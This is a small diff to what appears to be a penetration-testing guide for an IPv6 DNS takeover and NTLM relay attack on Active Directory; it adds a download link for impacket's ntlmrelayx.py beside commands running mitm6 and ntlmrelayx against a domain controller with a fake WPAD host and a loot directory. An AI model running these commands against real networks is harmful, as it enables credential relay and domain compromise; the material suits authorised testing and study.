@@ -48,6 +48,7 @@ sudo python mitm6.py -d <domain>.local
 ```
 
 5. run ntmlrelayx.py at the same time
+Download from: https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ntlmrelayx.py
 ```
 ntmlrelayx.py -6 -t ldaps://<DC-IP> -wh fakewpad.<domain>.local -l lootme
 ```
